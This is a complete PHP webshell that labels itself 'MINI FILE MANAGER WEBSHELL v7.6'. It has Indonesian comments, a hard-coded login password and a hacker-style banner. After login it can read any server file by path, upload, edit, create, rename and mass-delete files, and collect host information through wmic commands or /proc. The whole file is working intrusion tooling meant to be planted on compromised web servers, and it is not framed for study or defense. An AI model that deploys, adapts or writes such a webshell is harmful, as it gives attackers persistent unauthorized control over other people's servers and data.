<?php
// MINI FILE MANAGER WEBSHELL v7.6 - MONACO BLACK SCREEN FIXED (ESM + RESIZE OBSERVER)

$pass = 'm4ul123'; // GANTI PASSWORD !!!

session_start();

// ====================== ENDPOINT READ FILE ======================
if (isset($_GET['read'])) {
  if (!isset($_SESSION['auth'])) {
    http_response_code(403);
    exit(json_encode(['error' => 'unauthorized']));
  }
  $file = realpath($_GET['read']);
  if ($file && is_file($file) && is_readable($file)) {
    exit(json_encode(['status' => 'ok', 'content' => file_get_contents($file)]));
  }
  exit(json_encode(['status' => 'error', 'msg' => 'File tidak bisa dibaca']));
}

// ====================== AJAX STATS (10 detik) ======================
if (isset($_GET['stats']) && $_GET['stats'] === '1') {
  if (!isset($_SESSION['auth'])) exit(json_encode(['error' => 'unauthorized']));
  header('Content-Type: application/json');

  $os = php_uname('s');
  $cpu_load = 0;
  $ram_total_gb = $ram_used_gb = $ram_used_pct = $disk_total = $disk_free = 'N/A';

  if (function_exists('exec')) {
    // Windows stats
    @exec('wmic cpu get loadpercentage /format:list 2>nul', $out);
    foreach ($out as $line) {
      if (stripos($line, 'LoadPercentage=') !== false) {
        $cpu_load = (int)trim(str_replace('LoadPercentage=', '', $line));
        break;
      }
    }

    $ram_total = $ram_free = 0;
    @exec('wmic ComputerSystem get TotalPhysicalMemory /format:list 2>nul', $total);
    @exec('wmic OS get FreePhysicalMemory /format:list 2>nul', $free);
    foreach ($total as $line) if (stripos($line, 'TotalPhysicalMemory=') !== false) $ram_total = (int)trim(str_replace('TotalPhysicalMemory=', '', $line));
    foreach ($free as $line) if (stripos($line, 'FreePhysicalMemory=') !== false) $ram_free = (int)trim(str_replace('FreePhysicalMemory=', '', $line));

    $ram_total_gb = $ram_total ? round($ram_total / 1073741824, 2) : 'N/A';
    $ram_used_gb  = $ram_total ? round(($ram_total - $ram_free * 1024) / 1073741824, 2) : 'N/A';
    $ram_used_pct = $ram_total_gb !== 'N/A' ? round((($ram_total - $ram_free * 1024) / $ram_total) * 100, 1) : 0;

    $disk_total = round(@disk_total_space('/') / 1073741824, 2) ?: 'N/A';
    $disk_free  = round(@disk_free_space('/') / 1073741824, 2) ?: 'N/A';
  } else {
    // Linux stats with fallback only
    if (file_exists('/proc/loadavg')) {
      $loadavg = file_get_contents('/proc/loadavg');
      if ($loadavg !== false) {
        $load = explode(' ', $loadavg);
        $cpu_load = floatval($load[0]) * 10; // Rough estimation, adjust based on typical core count if needed
      }
    }

    if (file_exists('/proc/meminfo')) {
      $meminfo = file_get_contents('/proc/meminfo');
      if ($meminfo !== false) {
        preg_match_all('/MemTotal:\s*(\d+)/', $meminfo, $total_match);
        preg_match_all('/MemFree:\s*(\d+)/', $meminfo, $free_match);
        preg_match_all('/Buffers:\s*(\d+)/', $meminfo, $buffers_match);
        preg_match_all('/Cached:\s*(\d+)/', $meminfo, $cached_match);
        if (!empty($total_match[1][0])) {
          $ram_total_kb = intval($total_match[1][0]);
          $ram_free_kb = intval($free_match[1][0] ?? 0) + intval($buffers_match[1][0] ?? 0) + intval($cached_match[1][0] ?? 0);
          $ram_used_kb = $ram_total_kb - $ram_free_kb;
          $ram_total_gb = round($ram_total_kb / 1024 / 1024, 2);
          $ram_used_gb = round($ram_used_kb / 1024 / 1024, 2);
          $ram_used_pct = round(($ram_used_kb / $ram_total_kb) * 100, 1);
        }
      }
    }

    $disk_total = round(@disk_total_space('/') / 1073741824, 2) ?: 'N/A';
    $disk_free  = round(@disk_free_space('/') / 1073741824, 2) ?: 'N/A';
  }

  exit(json_encode([
    'cpu'       => (int)$cpu_load,
    'ram_used'  => $ram_used_gb,
    'ram_total' => $ram_total_gb,
    'ram_pct'   => $ram_used_pct,
    'disk_free' => $disk_free,
    'disk_total' => $disk_total
  ]));
}

// ====================== AJAX SAVE & NEW ======================
if (isset($_POST['action'])) {
  if (!isset($_SESSION['auth'])) exit(json_encode(['status' => 'error', 'msg' => 'unauthorized']));
  header('Content-Type: application/json');

  if ($_POST['action'] === 'save_file' && isset($_POST['path'], $_POST['content'])) {
    $path = realpath($_POST['path']);
    if ($path && is_file($path) && is_writable($path)) {
      file_put_contents($path, $_POST['content']);
      exit(json_encode(['status' => 'ok']));
    }
    exit(json_encode(['status' => 'error', 'msg' => 'Cannot write']));
  }

  if ($_POST['action'] === 'new_file' && isset($_POST['name'])) {
    $fname = basename(trim($_POST['name']));
    if ($fname && !file_exists($fname)) @touch($fname);
    exit(json_encode(['status' => 'ok']));
  }
}

// ====================== AUTH ======================
if (!isset($_SESSION['auth']) || (isset($_GET['p']) && $_GET['p'] === 'logout')) {
  if (isset($_POST['p']) && $_POST['p'] === $pass) $_SESSION['auth'] = true;
  else {
    die('<center style="margin-top:120px;font-family:monospace;color:#0f0;">
            <h2>LOGIN REQUIRED</h2>
            <form method="post"><input type="password" name="p" autofocus style="padding:12px;font-size:18px;width:280px;"><br><br><button type="submit">Enter</button></form>
        </center>');
  }
}

// ====================== DIR & ACTIONS ======================
$root = getcwd();
$dir = isset($_GET['d']) ? realpath($_GET['d']) : $root;
if (!$dir || !is_dir($dir)) $dir = $root;
chdir($dir);
$up = dirname($dir);

$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action'])) {
  if (isset($_FILES['ufile']) && $_FILES['ufile']['error'] === 0) {
    $target = basename($_FILES['ufile']['name']);
    if (move_uploaded_file($_FILES['ufile']['tmp_name'], $target)) $msg = "[+] Uploaded: <b>$target</b>";
    else $msg = "[!] Upload failed";
  }

  if (isset($_POST['del']) && file_exists($_POST['del'])) {
    $t = $_POST['del'];
    if (is_dir($t) && @rmdir($t)) $msg = "[+] Folder deleted";
    elseif (is_file($t) && @unlink($t)) $msg = "[+] File deleted";
    else $msg = "[!] Delete failed";
  }

  if (isset($_POST['rename_from'], $_POST['rename_to']) && $_POST['rename_from'] && $_POST['rename_to']) {
    $from = basename($_POST['rename_from']);
    $to = basename($_POST['rename_to']);
    if (@rename($from, $to)) $msg = "[+] Renamed: $from → $to";
    else $msg = "[!] Rename failed";
  }

  if (isset($_POST['mass_del']) && !empty($_POST['sel'])) {
    foreach ($_POST['sel'] as $item) {
      if (file_exists($item)) is_dir($item) ? @rmdir($item) : @unlink($item);
    }
    $msg = "[+] Selected deleted";
  }
}

// ====================== FULL SYSINFO ======================
$os_full = php_uname('s') . ' ' . php_uname('r') . ' (build ' . php_uname('v') . ')';
$cpu_name = $cores = $logical = $clock = 'N/A';
if (function_exists('exec')) {
  @exec('wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list 2>nul', $cpu_info);
  foreach ($cpu_info as $line) {
    if (strpos($line, 'Name=') !== false) $cpu_name = trim(str_replace('Name=', '', $line));
    if (strpos($line, 'NumberOfCores=') !== false) $cores = trim(str_replace('NumberOfCores=', '', $line));
    if (strpos($line, 'NumberOfLogicalProcessors=') !== false) $logical = trim(str_replace('NumberOfLogicalProcessors=', '', $line));
    if (strpos($line, 'MaxClockSpeed=') !== false) $clock = trim(str_replace('MaxClockSpeed=', '', $line));
  }
} else {
  // Fallback for environments where exec() is disabled
  if (file_exists('/proc/cpuinfo')) {
    $cpuinfo = file_get_contents('/proc/cpuinfo');
    if ($cpuinfo !== false) {
      preg_match_all('/model name\s*:\s*(.+)/i', $cpuinfo, $name_match);
      preg_match_all('/cpu cores\s*:\s*(\d+)/i', $cpuinfo, $cores_match);
      preg_match_all('/cpu MHz\s*:\s*(\d+)/i', $cpuinfo, $clock_match);
      if (!empty($name_match[1][0])) $cpu_name = $name_match[1][0];
      if (!empty($cores_match[1][0])) $cores = $cores_match[1][0];
      if (!empty($clock_match[1][0])) $clock = $clock_match[1][0];
      $logical = count(preg_grep('/processor\s*:/i', explode("\n", $cpuinfo)));
    }
  }
}
?>
<!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="utf-8">
  <title>File Manager • <?= htmlspecialchars(basename($dir)) ?></title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.12.4/sweetalert2.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.12.4/sweetalert2.all.min.js"></script>

  <!-- Monaco ESM loader (fix black screen & define error) -->
  <script type="module">
    import * as monaco from 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.52.0/min/vs/editor/editor.main.js';
    window.monaco = monaco;
  </script>

  <!-- Highcharts CDN -->
  <script src="https://code.highcharts.com/highcharts.js"></script>

  <style>
    body {
      background: #0a0a0a;
      color: #0f0;
      font-family: monospace;
      font-size: 14px;
      margin: 15px;
      line-height: 1.5;
    }

    a {
      color: #0ff;
      text-decoration: none;
      cursor: pointer;
    }

    a:hover {
      color: #fff;
      background: #222;
    }

    .dir {
      color: #6cf;
      font-weight: bold;
    }

    .file {
      color: #0f0;
    }

    .msg {
      color: #ff0;
      background: #300;
      padding: 8px 12px;
      margin: 10px 0;
      border: 1px solid #ff0;
      display: inline-block;
    }

    input,
    button {
      background: #111;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 6px 10px;
    }

    button:hover {
      background: #222;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin: 15px 0;
    }

    th,
    td {
      border: 1px solid #0f0;
      padding: 6px 10px;
      text-align: left;
    }

    th {
      background: #111;
      color: #0ff;
    }

    .size {
      text-align: right;
      color: #0c0;
    }

    .action {
      text-align: center;
      width: 220px;
    }

    .sysinfo {
      background: #111;
      padding: 12px;
      border: 1px solid #0f0;
      margin-bottom: 15px;
      font-size: 13px;
    }

    .sysinfo b {
      color: #0ff;
    }

    #charts {
      display: flex;
      gap: 20px;
      margin: 20px 0;
    }

    .chart-container {
      flex: 1;
      background: #111;
      padding: 12px;
      border: 1px solid #0f0;
      min-height: 240px;
    }

    .swal2-popup {
      padding: 0 !important;
      overflow: hidden !important;
      max-height: 95vh !important;
    }

    .swal2-html-container {
      margin: 0 !important;
      padding: 0 !important;
      height: 100% !important;
      width: 100% !important;
      overflow: hidden !important;
    }

    #editor-container {
      width: 100% !important;
      height: 100% !important;
      min-height: 520px !important;
      background: #1e1e1e !important;
      border: none !important;
    }

    .hacker-header {
      text-align: center;
      font-size: 28px;
      color: #00ff00;
      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
      margin: 10px 0;
      letter-spacing: 3px;
    }
  </style>
</head>

<body>
  <div class="hacker-header">P34C3_KHYREIN</div>

  <div class="sysinfo">
    <b>OS:</b> <?= htmlspecialchars($os_full) ?><br>
    <b>CPU:</b> <?= htmlspecialchars($cpu_name) ?> | Cores: <?= $cores ?> | Logical: <?= $logical ?> | Max Clock: <?= $clock ?> MHz<br>
    <b>Realtime:</b> CPU <span id="cpu-val">0</span>% | RAM <span id="ram-val">0 / 0 GB</span> (<span id="ram-pct">0</span>%) | Storage <span id="disk-val">0 / 0 GB</span>
  </div>

  <div id="charts">
    <div class="chart-container" id="cpuChart"></div>
    <div class="chart-container" id="ramChart"></div>
  </div>

  <?php if ($msg): ?><div class="msg"><?= $msg ?></div><?php endif; ?>

  <b>Path:</b> <?= htmlspecialchars($dir) ?><br>
  <a href="?d=<?= urlencode($up) ?>">[ .. ]</a> |
  <a href="?">[ root ]</a> |
  <a href="?p=logout">[ logout ]</a>

  <hr>

  <form method="post" enctype="multipart/form-data" style="margin:15px 0;">
    <input type="file" name="ufile">
    <button type="submit">Upload</button>
    &nbsp;&nbsp;
    <button type="button" onclick="newFile()">New File</button>
  </form>

  <form method="post" id="mainForm">
    <table>
      <tr>
        <th><input type="checkbox" onclick="this.form.elements['sel[]'].forEach(e=>e.checked=this.checked)"></th>
        <th>Name</th>
        <th>Type</th>
        <th class="size">Size</th>
        <th class="action">Action</th>
      </tr>

      <?php
      $items = scandir('.');
      $dirs = $files = [];
      foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = realpath($item);
        is_dir($full) ? $dirs[] = $item : $files[] = $item;
      }
      sort($dirs);
      sort($files);

      foreach ($dirs as $item) {
        $full = realpath($item);
        echo "<tr><td class='action'><input type='checkbox' name='sel[]' value='" . htmlspecialchars($full) . "'></td>
    <td><a class='dir' href='?d=" . urlencode($full) . "'>$item/</a></td>
    <td>[dir]</td><td class='size'>—</td>
    <td class='action'><button type='submit' name='del' value='" . htmlspecialchars($full) . "' onclick='return confirm(\"Hapus folder?\")'>del</button></td></tr>";
      }

      foreach ($files as $item) {
        $full = realpath($item);
        $size = filesize($full);
        $size_str = $size >= 1048576 ? round($size / 1048576, 1) . ' MB' : round($size / 1024, 1) . ' KB';
        echo "<tr><td class='action'><input type='checkbox' name='sel[]' value='" . htmlspecialchars($full) . "'></td>
    <td><a class='file' onclick='openEditor(\"" . addslashes($item) . "\")'>$item</a></td>
    <td>[file]</td><td class='size'>$size_str</td>
    <td class='action'>
        <button type='submit' name='del' value='" . htmlspecialchars($full) . "' onclick='return confirm(\"Hapus?\")'>del</button>
        &nbsp;
        <input type='hidden' name='rename_from' value='" . htmlspecialchars($item) . "'>
        <input type='text' name='rename_to' placeholder='new name' size='18'>
        <button type='submit'>rename</button>
    </td></tr>";
      }
      ?>
    </table>
    <button type="submit" name="mass_del" onclick="return confirm('Hapus selected?')">Delete Selected</button>
  </form>

  <script>
    // ====================== HIGHCHARTS & STATS (di onload) ======================
    window.onload = function() {
      Highcharts.setOptions({
        credits: {
          enabled: false
        },
        lang: {
          thousandsSep: '.',
          decimalPoint: ','
        }
      });

      // Highcharts CPU
      const cpuChart = Highcharts.chart('cpuChart', {
        chart: {
          type: 'line',
          backgroundColor: '#111',
          height: 240
        },
        title: {
          text: 'CPU Load (%)',
          style: {
            color: '#0f0'
          }
        },
        xAxis: {
          type: 'datetime',
          labels: {
            style: {
              color: '#0f0'
            }
          }
        },
        yAxis: {
          title: {
            text: null
          },
          min: 0,
          max: 100,
          labels: {
            style: {
              color: '#0f0'
            }
          },
          gridLineColor: '#333'
        },
        tooltip: {
          valueSuffix: ' %',
          backgroundColor: '#222',
          borderColor: '#0f0',
          style: {
            color: '#0f0'
          }
        },
        legend: {
          itemStyle: {
            color: '#0f0'
          }
        },
        legend: {
          enabled: false
        },
        series: [{
          name: 'CPU',
          data: [],
          color: '#0f0',
          marker: {
            enabled: false
          }
        }]
      });

      // Highcharts RAM
      const ramChart = Highcharts.chart('ramChart', {
        chart: {
          type: 'line',
          backgroundColor: '#111',
          height: 240
        },
        title: {
          text: 'RAM Usage (%)',
          style: {
            color: '#ff0'
          }
        },
        xAxis: {
          type: 'datetime',
          labels: {
            style: {
              color: '#ff0'
            }
          }
        },
        yAxis: {
          title: {
            text: null
          },
          min: 0,
          max: 100,
          labels: {
            style: {
              color: '#ff0'
            }
          },
          gridLineColor: '#333'
        },
        tooltip: {
          valueSuffix: ' %',
          backgroundColor: '#222',
          borderColor: '#ff0',
          style: {
            color: '#ff0'
          }
        },
        legend: {
          itemStyle: {
            color: '#ff0'
          }
        },
        legend: {
          enabled: false
        },
        series: [{
          name: 'RAM',
          data: [],
          color: '#ff0',
          marker: {
            enabled: false
          }
        }]
      });

      let cpuPoints = [],
        ramPoints = [];

      function updateStats() {
        fetch('?stats=1')
          .then(r => r.json())
          .then(data => {
            if (data.error) return;

            document.getElementById('cpu-val').textContent = data.cpu;
            document.getElementById('ram-val').textContent = data.ram_used + ' / ' + data.ram_total + ' GB';
            document.getElementById('ram-pct').textContent = data.ram_pct;
            document.getElementById('disk-val').textContent = data.disk_free + ' / ' + data.disk_total + ' GB';

            const now = new Date().getTime();
            cpuPoints.push([now, data.cpu]);
            ramPoints.push([now, data.ram_pct]);

            if (cpuPoints.length > 30) cpuPoints.shift();
            if (ramPoints.length > 30) ramPoints.shift();

            cpuChart.series[0].setData(cpuPoints, true);
            ramChart.series[0].setData(ramPoints, true);
          })
          .catch(e => console.error('Fetch error:', e));
      }

      setInterval(updateStats, 10000);
      updateStats();
    };

    // ====================== MONACO EDITOR (di luar onload - ESM) ======================
    async function openEditor(filename) {
      const Swal = window.Swal;

      Swal.fire({
        title: 'Editing: ' + filename,
        html: '<div id="editor-container"></div>',
        width: '90vw',
        heightAuto: false,
        padding: '0',
        showCancelButton: true,
        confirmButtonText: 'Save',
        cancelButtonText: 'Close',
        didOpen: async () => {
          const container = document.getElementById('editor-container');
          container.style.width = '100%';
          container.style.height = '520px';

          // Monaco ESM
          const monaco = window.monaco;
          const editor = monaco.editor.create(container, {
            value: '// Loading...',
            language: getLanguage(filename),
            theme: 'vs-dark',
            automaticLayout: true,
            minimap: {
              enabled: false
            },
            fontSize: 14,
            wordWrap: 'on',
            lineNumbers: 'on'
          });

          try {
            const res = await fetch(`?read=${encodeURIComponent(filename)}`);
            const data = await res.json();
            if (data.status === 'ok') {
              editor.setValue(data.content);
            } else {
              editor.setValue('// Error: ' + (data.msg || 'File tidak bisa dibaca'));
            }
          } catch (e) {
            editor.setValue('// Fetch error: ' + e.message);
          }

          // Force layout + resize observer
          const forceLayout = () => {
            editor.layout();
            editor.focus();
          };

          setTimeout(forceLayout, 100);
          setTimeout(forceLayout, 500);
          setTimeout(forceLayout, 1000);

          // Resize observer untuk popup
          const resizeObserver = new ResizeObserver(forceLayout);
          resizeObserver.observe(container);

          // Save handler
          Swal.getConfirmButton().onclick = async (e) => {
            e.preventDefault();
            const content = editor.getValue();
            const res = await fetch('', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
              },
              body: 'action=save_file&path=' + encodeURIComponent(filename) + '&content=' + encodeURIComponent(content)
            });
            const saveData = await res.json();
            if (saveData.status === 'ok') {
              Swal.fire('Saved!', '', 'success');
            } else {
              Swal.fire('Error', saveData.msg || 'Gagal simpan', 'error');
            }
          };
        }
      });
    }

    function getLanguage(filename) {
      const ext = filename.split('.').pop().toLowerCase();
      const map = {
        php: 'php',
        js: 'javascript',
        html: 'html',
        css: 'css',
        json: 'json',
        htaccess: 'apache_conf',
        txt: 'plaintext'
      };
      return map[ext] || 'plaintext';
    }

    function newFile() {
      Swal.fire({
        title: 'Buat File Baru',
        input: 'text',
        inputLabel: 'Nama file',
        showCancelButton: true,
        confirmButtonText: 'Buat & Edit'
      }).then(result => {
        if (result.isConfirmed && result.value?.trim()) {
          const fname = result.value.trim();
          fetch('', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'action=new_file&name=' + encodeURIComponent(fname)
          }).then(() => openEditor(fname));
        }
      });
    }
  </script>

  <hr>
  <small>v7.6 • Highcharts di window.onload • Monaco ESM + resize observer fixed • RAM full • Stats 10 detik • <?= date('Y-m-d H:i:s') ?></small>

</body>

</html>